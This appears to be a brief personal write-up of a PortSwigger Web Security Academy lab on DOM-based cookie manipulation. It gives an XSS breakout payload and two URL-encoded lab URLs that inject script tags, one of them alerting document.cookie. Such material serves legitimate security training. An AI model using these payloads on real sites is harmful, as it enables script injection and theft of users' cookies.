# DOM-based cookie manipulation

## This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause [XSS](https://portswigger.net/web-security/cross-site-scripting) on a different page and call the `print()` function. You will need to use the exploit server to direct the victim to the correct pages.

first payload `&'><script>alert(1)</script>`

```
https://0a0f001904aa1b5f812c16f700510002.web-security-academy.net/product?productId=1&%27%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
```

```
https://0a0f001904aa1b5f812c16f700510002.web-security-academy.net/product?productId=1&%27%3E%3Cscript%3Ealert(1)%3C/script%3E
```
